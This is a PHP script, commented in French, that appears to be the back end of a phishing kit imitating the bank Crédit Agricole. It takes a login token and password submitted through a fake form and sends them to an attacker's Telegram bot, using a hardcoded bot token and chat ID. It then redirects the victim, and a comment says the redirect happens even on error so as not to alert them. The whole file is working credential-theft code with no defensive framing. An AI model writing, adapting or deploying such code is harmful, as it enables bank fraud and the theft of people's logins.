<?php
// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $_token = $_POST["_token"];
    $motdepasse = $_POST["motdepasse"];

    // Initialiser l'API de Telegram avec votre jeton d'API
    $telegram = new Telegram('6844528973:AAHY1U17RfQEesD-LCqs8U1tD1a6x28EzJk');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "📨 We Credt Agri :\n\n";
    $message .= "👤 Token: $_token\n";
    $message .= "📞 Mpt de pass: $motdepasse\n";

    // L'ID du chat où vous voulez envoyer le message
    $chatId = '1142771792';

    // Envoyer le message à Telegram
    try {
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
        ];

        $response = Request::sendMessage($data);
        
        // Rediriger l'utilisateur vers la page de confirmation
        header("Location: ../final/final.html");
        exit();
        
    } catch (Exception $e) {
        error_log("Erreur Telegram: " . $e->getMessage());
        // En cas d'erreur, rediriger quand même pour ne pas alerter l'utilisateur
        header("Location: ./index.html");
        exit();
    }
} else {
    echo "Méthode non autorisée.";
}
?>